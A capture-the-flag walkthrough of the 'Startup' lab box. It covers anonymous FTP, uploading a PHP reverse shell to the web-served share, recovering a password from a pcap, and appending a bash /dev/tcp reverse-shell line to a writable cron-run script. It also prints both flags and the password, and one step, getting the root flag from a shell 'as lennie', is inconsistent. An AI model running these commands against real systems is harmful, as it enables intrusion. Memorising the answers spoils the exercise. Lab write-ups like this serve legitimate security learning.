# Startup

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---

## FTP

Logged in anonymously and saw these files:

```
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

Reading `notice.txt`:

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. 
People downloading documents from our website will think we are a joke! 
Now I dont know who it is, but Maya is looking pretty sus.
```

We now know there’s a person named **maya**.

Opening the image gave an error, so I had to convert it to JPEG. Nothing useful there.

<img width="1847" height="963" alt="Screenshot From 2025-09-05 22-00-13" src="https://github.com/user-attachments/assets/b516c365-a3ea-4fff-996a-9c7eac049028" />

---

## Web Enumeration

Running dirsearch on the web page:

```bash
dirsearch -u http://startup.thm -e * -t 50
```

```
03:01:55  301   302B  /files  →  http://startup/files/
03:01:55  200   508B  /files/
```

<img width="1847" height="963" alt="Screenshot From 2025-09-05 22-01-50" src="https://github.com/user-attachments/assets/3b99eb71-d8c0-4d50-9c3a-282d10fcf405" />

At `/files/` we saw the same files as in the FTP server. That means FTP is tied to the web server.

---

## Reverse Shell Upload

When going to the files path its the same files we have in the ftp server. 
So lets go back to enumerating and find that developer website maybe. 
Nothing came up but going back to the ftp server. I discovered something. 
If we have access to the web server side of the ftp and the ftp server we can upload a file on the ftp server of a reverse shell and access it on the website.

Reverse shell code:
[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```bash
ftp> put reverse_shell.php
local: reverse_shell.php remote: reverse_shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```

Then browsed to:

```
http://startup.thm/files/ftp/reverse_shell.php
```
<img width="1847" height="963" alt="Screenshot From 2025-09-05 22-28-37" src="https://github.com/user-attachments/assets/83db3535-38ed-4dbe-89e2-4cad256b3d0e" />

Listener caught the shell:

```bash
nc -lvnp 4444
```

---

## First Flag

On the server:

```bash
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured 
I can't keep it a secret forever and told him it was love.
```

Found **suspicious.pcapng** under `/incidents/`.

But now we cant get into the lennie user since I dont have permissions. 
Looking around under incidents  we see a suspicious.pcapng. 
We download it to the main machine and open it up.Looks like someone else has copied a webshell here in the past. 
After looking around we get the password. Hint if you right-click a packet and press Follow > TCP Stream. You get this screen and the password.:

<img width="1847" height="963" alt="Screenshot From 2025-09-05 23-12-57" src="https://github.com/user-attachments/assets/703fc2a3-2e25-4834-951f-87533354cc56" />

```
c4ntg3t3n0ughsp1c3
```

Switched to user `lennie`:

```bash
su lennie
Password: c4ntg3t3n0ughsp1c3
```

First flag:

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

---

## Lennie’s Documents

```bash
lennie@startup:~/Documents$ ls
concern.txt  list.txt  note.txt

cat note.txt
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.

cat list.txt
Shoppinglist: Cyberpunk 2077 | Milk | Dog food

cat concern.txt
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
```

---

## Privilege Escalation

Earlier I found a suspicious script in `/home/lennie/scripts/`:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

This script executes `/etc/print.sh`. Checking permissions:

```bash
ls -la /etc/print.sh
```

It was writable. That meant I could add my own payload.

Added a reverse shell:

```bash
echo "bash -i >& /dev/tcp/10.8.x.x/4444 0>&1" >> /etc/print.sh
```

Listener:

```bash
nc -lvnp 4444
```

After cron triggered, I got a shell back as lennie.

Second flag:

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

## Flags

> Q1: User flag
> A1: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

> Q2: Root flag
> A2: THM{f963aaa6a430f210222158ae15c3d76d}
